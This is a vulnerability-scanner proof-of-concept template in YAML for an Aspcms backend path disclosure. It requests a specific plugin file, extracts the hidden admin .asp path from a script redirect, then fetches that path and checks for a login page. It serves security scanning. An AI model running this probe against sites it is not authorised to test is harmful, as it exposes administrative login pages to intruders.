id: poc-yaml-aspcms-backend-leak
info:
  name: Aspcms 后台泄露漏洞
  severity: high
  tags:
  - 信息泄露
  finger: Aspcms
  reference: []
  description: null
variables: {}
transport: http
requests:
- method: GET
  path: /plug/oem/AspCms_OEMFun.asp
  headers: {}
  data: null
  redirect: false
  raw: null
  timeout: null
  expression: status_code == 200 && matches(body, "<script>alert") && matches(body,
    "top.location.href='(.*?)';")
  output:
  - regex_match(body,"(?P<path>(/(.*?).asp))")
- method: GET
  path: /{{.path}}
  headers: {}
  data: null
  redirect: false
  raw: null
  timeout: null
  expression: status_code == 200 && contains(body, "username")
  output: []
